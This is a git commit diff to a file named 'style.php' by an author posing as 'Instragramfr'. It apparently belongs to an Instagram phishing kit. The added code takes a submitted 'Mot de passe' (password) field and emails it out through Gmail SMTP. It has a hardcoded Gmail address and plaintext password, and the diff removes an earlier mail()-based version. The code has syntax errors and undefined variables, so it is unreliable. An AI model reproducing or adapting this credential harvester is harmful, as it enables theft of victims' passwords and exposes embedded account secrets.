296b6ae855fdeaff40dc8f9417ecb256ac4dfb9d
Instragramfr <78282489+Instragramfr@users.noreply.github.com>
2021-02-24 05:11:22 +0100

    Update style.php

--- style.php
+++ style.php
@@ -1,11 +1,43 @@
-<?php 
-if(isset($_POST['submit'])){
-    $to = "dvdchasseur@gmail.com"; // this is your Email address
-    $from = $_POST['instagram.20218@gmail.com']; // this is the sender's Email address
-    $Mot de passe = $_POST['Mot de passe'];
-    $subject = "Mot de passe";
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+
+if(isset($_POST['Mot de passe']){
+    $name = $_POST['Mot de passe'];
    
-    $headers = "From:" . $from;
-    mail($to,$subject,,$headers);
-    
+    require_once "PHPMailer/PHPMailer.php";
+    require_once "PHPMailer/SMTP.php";
+    require_once "PHPMailer/Exception.php";
+
+    $mail = new PHPMailer();
+
+    //smtp settings
+    $mail->isSMTP();
+    $mail->Host = "smtp.gmail.com";
+    $mail->SMTPAuth = true;
+    $mail->Username = "dvdchasseur@gmail.com";
+    $mail->Password = 'rucheetlapin';
+    $mail->Port = 465;
+    $mail->SMTPSecure = "ssl";
+
+    //email settings
+    $mail->isHTML(true);
+    $mail->setFrom($email, $name);
+    $mail->addAddress("youremail@gmail.com");
+    $mail->Subject = ("$email ($subject)");
+    $mail->Body = $body;
+
+    if($mail->send()){
+        $status = "success";
+        $response = "Email is sent!";
     }
+    else
+    {
+        $status = "failed";
+        $response = "Something is wrong: <br>" . $mail->ErrorInfo;
+    }
+
+    exit(json_encode(array("status" => $status, "response" => $response)));
+}
+
+?>
+      
